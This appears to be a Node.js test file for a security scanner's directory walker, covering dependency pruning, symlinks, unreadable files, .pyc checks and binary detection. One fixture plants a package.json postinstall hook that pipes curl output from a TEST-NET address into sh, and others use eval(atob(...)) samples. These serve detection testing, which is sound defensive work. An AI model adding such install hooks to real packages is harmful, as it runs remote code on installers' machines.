// Review regressions: the directory walker (review findings 5, 6, 10, 15
// SC-BINARY; shared semantics 8, 9, 11). The expectations were checked
// against the Python CLI on the same trees (identical issue multisets).
// Fixtures are inert: no file is executed; hosts are TEST-NET/.invalid.

import { test } from "node:test";
import assert from "node:assert/strict";
import {
  mkdtempSync, writeFileSync, mkdirSync, rmSync, readFileSync, symlinkSync, chmodSync,
} from "node:fs";
import { execFileSync, spawnSync } from "node:child_process";
import { tmpdir } from "node:os";
import { join, sep, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { run, collectFiles } from "../src/index.js";
import { isLink, dirKey } from "../src/lib/fs.js";

const POSIX = process.platform !== "win32";
const BIN = fileURLToPath(new URL("../bin/lazaret.js", import.meta.url));
const P = (...parts) => parts.join(sep);          // report paths use the OS separator

function tree(files) {
  const d = mkdtempSync(join(tmpdir(), "lazaret-walk-"));
  for (const [rel, data] of Object.entries(files)) {
    const p = join(d, rel);
    mkdirSync(dirname(p), { recursive: true });
    writeFileSync(p, data);
  }
  return d;
}
function scan(d, extra = []) {
  const out = [], err = [];
  const code = run(["check", d, "--no-html", "--json", join(d, "..", `${d.split(sep).pop()}.json`), ...extra],
    { out: (s) => out.push(s), err: (s) => err.push(s), env: {} });
  const rep = JSON.parse(readFileSync(join(d, "..", `${d.split(sep).pop()}.json`), "utf8"));
  rmSync(join(d, "..", `${d.split(sep).pop()}.json`), { force: true });
  return { code, err: err.join("\n"), rep, keys: rep.issues.map((i) => `${i.rule} ${i.file}`).sort() };
}
const cleanup = (d) => rmSync(d, { recursive: true, force: true });

test("dependency trees are pruned without --deps and reported root-relative", () => {
  // was: node_modules/typescript/lib/typescript.js (2.75 MB) → CRITICAL SC-TRUNCATED, exit 1,
  // and any dependency's install hook failed the gate
  const d = tree({
    "app.py": "x = 1\n",
    "node_modules/typescript/lib/typescript.js": "var x = 1;\n".repeat(250000),
    "node_modules/evil/package.json": '{"name":"evil","scripts":{"postinstall":"curl http://192.0.2.1/x | sh"}}',
  });
  try {
    let r = scan(d, ["--ci"]);
    assert.equal(r.code, 0, r.err);
    assert.deepEqual(r.keys, ["Q-SKIPPED-TREE node_modules"]);
    assert.equal(r.rep.issues[0].msg, "Directory node_modules was skipped (2 files, 2750072 bytes unread).");
    r = scan(d, ["--deps"]);                  // 2.75 MB is under the 16,000,000-byte limit: scanned
    assert.deepEqual(r.keys, [`SC-INSTALL-HOOK ${P("node_modules", "evil", "package.json")}`]);
    r = scan(d, ["--deps", "--max-source-bytes", "2000000"]);
    assert.deepEqual(r.keys, [
      `SC-INSTALL-HOOK ${P("node_modules", "evil", "package.json")}`,
      `SC-TRUNCATED ${P("node_modules", "typescript", "lib", "typescript.js")}`,
    ]);
  } finally { cleanup(d); }
});

test("vendor/venv/env are pruned only when they look like dependency trees", () => {
  const d = tree({
    "vendor/lib.js": "eval(v)\n",                                  // no marker: first-party code
    "third/vendor/modules.txt": "# example.invalid/mod v1\n",      // Go vendor tree
    "third/vendor/x.js": "eval(q)\n",
    "php/vendor/autoload.php": "<?php\n",
    "venv/pyvenv.cfg": "home = /usr\n",
    "venv/lib/x.py": "eval(q)\n",
    "env/settings.py": "eval(e)\n",                                // no pyvenv.cfg: first-party
  });
  try {
    const r = scan(d);
    assert.deepEqual(r.keys, [
      `Q-SKIPPED-TREE ${P("php", "vendor")}`,
      `Q-SKIPPED-TREE ${P("third", "vendor")}`,
      "Q-SKIPPED-TREE venv",
      `S-EVAL-JS ${P("vendor", "lib.js")}`,
      `S-EVAL-PY ${P("env", "settings.py")}`,
    ].sort());
  } finally { cleanup(d); }
});

test("only `.git` itself is skipped: .github/.githooks/.gitlab are scanned", () => {
  // was: startsWith(".git") hid .github/scripts/deploy.js
  const d = tree({
    ".github/scripts/deploy.js": "eval(atob(x))\n",
    ".githooks/pre-commit.js": "eval(h)\n",
    ".gitlab/ci.js": "eval(l)\n",
    ".git/hooks/x.js": "eval(g)\n",
  });
  try {
    const r = scan(d);
    assert.deepEqual(r.keys, [
      "Q-SKIPPED-TREE .git",
      `S-EVAL-JS ${P(".githooks", "pre-commit.js")}`,
      `S-EVAL-JS ${P(".github", "scripts", "deploy.js")}`,
      `S-EVAL-JS ${P(".gitlab", "ci.js")}`,
      `SC-EVAL-DECODE ${P(".github", "scripts", "deploy.js")}`,
      `T-CODE ${P(".github", "scripts", "deploy.js")}`,
    ].sort());
  } finally { cleanup(d); }
});

test("a non-UTF-8 file name is scanned and reported as \\xNN text", { skip: process.platform !== "linux" }, () => {
  // was: the U+FFFD-decoded name failed lstat and the file vanished silently
  const d = tree({ "ok.py": "x = 1\n" });
  try {
    writeFileSync(Buffer.concat([Buffer.from(join(d, "bad")), Buffer.from([0xff]), Buffer.from(".js")]), "eval(b)\n");
    mkdirSync(Buffer.concat([Buffer.from(join(d, "dir")), Buffer.from([0xfe])]));
    writeFileSync(Buffer.concat([Buffer.from(join(d, "dir")), Buffer.from([0xfe]), Buffer.from("/x.js")]), "eval(c)\n");
    const r = scan(d);
    assert.deepEqual(r.keys, ["S-EVAL-JS bad\\xff.js", "S-EVAL-JS dir\\xfe/x.js"]);
  } finally { cleanup(d); }
});

test("symlinks are never followed (Q-SYMLINK); special files are never opened (Q-UNREADABLE)", { skip: !POSIX }, () => {
  const d = tree({ "a.py": "x = 1\n", "sub/b.py": "y = 2\n" });
  try {
    symlinkSync("/etc/passwd", join(d, "link.js"));
    symlinkSync(d, join(d, "sub", "loop"));                        // a directory loop
    let fifo = true;
    try { execFileSync("mkfifo", [join(d, "pipe.js")]); } catch { fifo = false; }
    const r = scan(d);
    assert.equal(r.code, 0, r.err);
    const expect = ["Q-SYMLINK link.js", `Q-SYMLINK ${P("sub", "loop")}`];
    if (fifo) expect.push("Q-UNREADABLE pipe.js");
    assert.deepEqual(r.keys, expect.sort());
    const link = r.rep.issues.find((i) => i.file === "link.js");
    assert.equal(link.msg, "Symbolic link link.js -> /etc/passwd was not followed; its target was not scanned.");
    assert.equal(link.sev, "INFO");
  } finally { cleanup(d); }
});

test("links are reported on every OS: a file symlink and a directory link (a junction on Windows)", (t) => {
  const d = tree({ "mod.py": "x = 1\n", "sub/b.py": "y = 2\n" });
  try {
    try {
      symlinkSync(join(d, "mod.py"), join(d, "link.py"), "file");
    } catch (e) {
      t.skip(`this OS or user cannot create symlinks (${e.code}; Windows needs Developer Mode or the privilege)`);
      return;
    }
    symlinkSync(d, join(d, "sub", "loop"), "junction");   // the type is ignored outside Windows
    const r = scan(d);
    assert.equal(r.code, 0, r.err);
    assert.deepEqual(r.keys, ["Q-SYMLINK link.py", `Q-SYMLINK ${P("sub", "loop")}`].sort());
  } finally { cleanup(d); }
});

test("a link is decided by the listing's entry type too, not by lstat alone (Windows)", (t) => {
  // On the windows-latest runners lstat reported a file symlink as a regular
  // file; the directory listing flags every reparse point. Simulated here
  // with the stat results that host returned.
  const d = tree({ "mod.py": "x = 1\n", "sub/b.py": "y = 2\n" });
  try {
    try { symlinkSync(join(d, "mod.py"), join(d, "link.py"), "file"); } catch (e) {
      t.skip(`this OS or user cannot create symlinks (${e.code})`);
      return;
    }
    const asFile = { isSymbolicLink: () => false, isDirectory: () => false };
    const asDir = { isSymbolicLink: () => false, isDirectory: () => true };
    assert.equal(isLink({ link: true }, join(d, "link.py"), asFile), true);    // what that lstat said
    assert.equal(isLink({ link: true }, join(d, "mod.py"), asFile), false);    // dedup/cloud file: no target
    assert.equal(isLink({ link: true }, join(d, "sub"), asDir), true);         // junction, mount point
    assert.equal(isLink({ link: false }, join(d, "link.py"), asFile), false);
    assert.equal(isLink({ link: false }, join(d, "link.py"),
      { isSymbolicLink: () => true, isDirectory: () => false }), true);
  } finally { cleanup(d); }
});

test("unreadable files and directories become Q-UNREADABLE instead of a crash", { skip: !POSIX }, (t) => {
  // was: EACCES from readdirSync/readFileSync crashed the run (exit 1, no report).
  // root reads everything, so run the CLI as an unprivileged user when we are root.
  const d = tree({ "a.py": "x = 1\n", "secret.js": "eval(s)\n", "locked/x.js": "eval(l)\n" });
  const out = mkdtempSync(join(tmpdir(), "lazaret-walk-out-"));
  try {
    chmodSync(d, 0o755);
    chmodSync(out, 0o777);
    chmodSync(join(d, "secret.js"), 0o000);
    chmodSync(join(d, "locked"), 0o000);
    let cmd = [process.execPath, BIN];
    if (process.getuid && process.getuid() === 0) {
      const probe = spawnSync("unshare", ["-U", process.execPath, BIN, "--version"], { encoding: "utf8" });
      if (probe.status !== 0) { t.skip("running as root and `unshare -U` is unavailable"); return; }
      cmd = ["unshare", "-U", ...cmd];
    }
    const res = spawnSync(cmd[0], [...cmd.slice(1), "check", d, "--out-dir", out, "--no-html", "-q"],
      { encoding: "utf8", timeout: 30000 });
    assert.equal(res.status, 0, res.stderr);
    const rep = JSON.parse(readFileSync(join(out, "lazaret-report.json"), "utf8"));
    assert.deepEqual(rep.issues.map((i) => [i.rule, i.file, i.msg]).sort(), [
      ["Q-UNREADABLE", "locked", "locked could not be read (Permission denied); it was not scanned."],
      ["Q-UNREADABLE", "secret.js", "secret.js could not be read (Permission denied); it was not scanned."],
    ]);
  } finally {
    try { chmodSync(join(d, "locked"), 0o755); } catch { /* ignore */ }
    cleanup(d);
    cleanup(out);
  }
});

test("__pycache__: unchecked-hash and orphan .pyc files are flagged; sources are not skipped-tree noise", () => {
  const magic = Buffer.from([0xa7, 0x0d, 0x0d, 0x0a]);            // CPython 3.11 magic (…\r\n)
  const pyc = (flags) => Buffer.concat([magic, Buffer.from([flags, 0, 0, 0]), Buffer.alloc(8)]);
  const d = tree({
    "mod.py": "x = 1\n",
    "__pycache__/mod.cpython-311.pyc": pyc(0),                     // timestamp pyc with its source: fine
    "__pycache__/gone.cpython-311.pyc": pyc(1),                    // unchecked hash, no source
  });
  try {
    const r = scan(d);
    const g = P("__pycache__", "gone.cpython-311.pyc");
    assert.deepEqual(r.rep.issues.map((i) => [i.rule, i.file, i.sev]).sort(),
      [["SC-PYC-ORPHAN", g, "MAJOR"], ["SC-PYC-UNCHECKED", g, "CRITICAL"]]);
  } finally { cleanup(d); }
});

test("non-source files are classified by magic bytes; the size cap applies to sources only", () => {
  const d = tree({
    "app.py": "x = 1\n",
    "lib/native.so": Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]), Buffer.alloc(600)]),
    "lib/renamed.txt": Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]), Buffer.alloc(600)]),
    "data/blob.bin": Buffer.alloc(2_100_000),                      // > 2 MB, not a source: no SC-TRUNCATED
  });
  try {
    const r = scan(d);
    assert.deepEqual(r.rep.issues.map((i) => [i.rule, i.file, i.sev]).sort(), [
      ["SC-BINARY", P("lib", "native.so"), "MAJOR"],
      ["SC-BINARY", P("lib", "renamed.txt"), "MAJOR"],
    ]);
  } finally { cleanup(d); }
});

test("a directory's identity keeps all 64 bits of a Windows file ID", () => {
  // NTFS file IDs: a 16-bit sequence number above a 48-bit record number.
  // Records 1000 and 1001 with sequence number 0x1234 are one Number: the
  // loop check skipped the second directory as "already visited" (the
  // 600-level tree below found no files on windows-latest).
  const a = { dev: 7n, ino: (0x1234n << 48n) | 1000n }, b = { dev: 7n, ino: (0x1234n << 48n) | 1001n };
  assert.equal(Number(a.ino), Number(b.ino));
  assert.notEqual(dirKey(a), dirKey(b));
  assert.equal(dirKey({ dev: 7n, ino: 0n }), null);          // no inode numbers: no loop check
});

test("the walk is iterative: a very deep tree is scanned without recursion", (t) => {
  const d = mkdtempSync(join(tmpdir(), "lazaret-deep-"));
  try {
    const parts = Array(600).fill("d");
    try {
      mkdirSync(join(d, ...parts), { recursive: true });
    } catch (e) {
      // macOS caps a path at 1024 bytes (PATH_MAX); Linux allows 4096 and
      // the Windows runners have long paths enabled
      if (e.code !== "ENAMETOOLONG") throw e;
      t.skip("this OS limits paths to fewer bytes than a 600-level tree needs (macOS: 1024)");
      return;
    }
    writeFileSync(join(d, ...parts, "x.js"), "eval(y)\n");
    const col = collectFiles(d);
    assert.equal(col.files.length, 1, JSON.stringify(col.binaryIssues.map((i) => i.msg)));
    assert.equal(col.files[0].path, P(...parts, "x.js"));
  } finally { cleanup(d); }
});
